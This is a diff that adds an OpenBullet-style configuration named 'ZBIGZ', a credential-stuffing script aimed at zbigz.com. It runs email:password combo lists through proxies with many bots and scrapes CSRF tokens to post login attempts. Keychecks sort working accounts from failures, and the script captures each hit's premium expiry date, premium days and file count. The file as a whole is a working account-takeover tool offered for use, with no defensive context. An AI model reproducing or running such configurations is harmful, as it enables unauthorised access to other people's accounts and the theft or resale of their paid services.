@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "ZBIGZ",
+  "SuggestedBots": 50,
+  "LastModified": "2018-10-22T23:14:53.3736375+02:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_PAGE REQUEST GET "https://zbigz.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+#REQUEST_TOKENS REQUEST POST "https://api.zbigz.com/v1/account/auth/token" AutoRedirect=TRUE 
+  CONTENT "------WebKitFormBoundaryaFhLBgtfHP5NQz1K\nContent-Disposition: form-data; name=\"undefined\"\n\nundefined\n------WebKitFormBoundaryaFhLBgtfHP5NQz1K--" 
+  CONTENTTYPE "multipart/form-data; boundary=----WebKitFormBoundaryaFhLBgtfHP5NQz1K" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://zbigz.com" 
+  HEADER "Referer: https://zbigz.com/login" 
+#PARSE_TOKEN_NAME PARSE "<SOURCE>" JSON "auth_token_name" Recursive=FALSE -> VAR "ATN" "" "" 
+#PARSE_TOKEN_VALUE PARSE "<SOURCE>" JSON "auth_token_value" Recursive=FALSE -> VAR "ATV" "" "" 
+#REQUEST_LOGIN REQUEST POST "https://api.zbigz.com/v1/account/login" AutoRedirect=TRUE 
+  CONTENT "------WebKitFormBoundaryEfSwWV31CZyhkmxV\nContent-Disposition: form-data; name=\"login\"\n\n<USER>\n------WebKitFormBoundaryEfSwWV31CZyhkmxV\nContent-Disposition: form-data; name=\"email\"\n\n<USER>\n------WebKitFormBoundaryEfSwWV31CZyhkmxV\nContent-Disposition: form-data; name=\"password\"\n\n<PASS>\n------WebKitFormBoundaryEfSwWV31CZyhkmxV\nContent-Disposition: form-data; name=\"csrf_name\"\n\n<ATN>\n------WebKitFormBoundaryEfSwWV31CZyhkmxV\nContent-Disposition: form-data; name=\"csrf_value\"\n\n<ATV>\n------WebKitFormBoundaryEfSwWV31CZyhkmxV\nContent-Disposition: form-data; name=\"recaptcha\"\n\n------WebKitFormBoundaryEfSwWV31CZyhkmxV--" 
+  CONTENTTYPE "multipart/form-data; boundary=----WebKitFormBoundaryEfSwWV31CZyhkmxV" 
+  HEADER "Accept: application/json, application/xml, text/plain, text/html, *.*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://zbigz.com" 
+  HEADER "Referer: https://zbigz.com/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "error\":true" 
+  KEYCHAIN Success OR 
+    KEY "\"session\"" 
+#REQUEST_DATA_PAGE REQUEST POST "https://api.zbigz.com/v1/account/info" AutoRedirect=TRUE 
+  CONTENT "------WebKitFormBoundaryPcrS8NKyJl88n83b\nContent-Disposition: form-data; name=\"undefined\"\n\nundefined\n------WebKitFormBoundaryPcrS8NKyJl88n83b--" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, application/xml, text/plain, text/html, *.*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://zbigz.com" 
+  HEADER "Referer: https://zbigz.com/myfiles" 
+#PARSE_VALIDITY_DATE PARSE "<SOURCE>" JSON "premium_valid_date" Recursive=FALSE -> CAP "PREM VALID DATE" "" "" 
+#PARSE_PREMIUM_DAYS PARSE "<SOURCE>" JSON "premium_days" Recursive=FALSE -> CAP "PREM DAYS" "" "" 
+#PARSE_FILE_COUNT PARSE "<SOURCE>" JSON "archiveFiles" Recursive=FALSE -> CAP "FILES" "" "" 
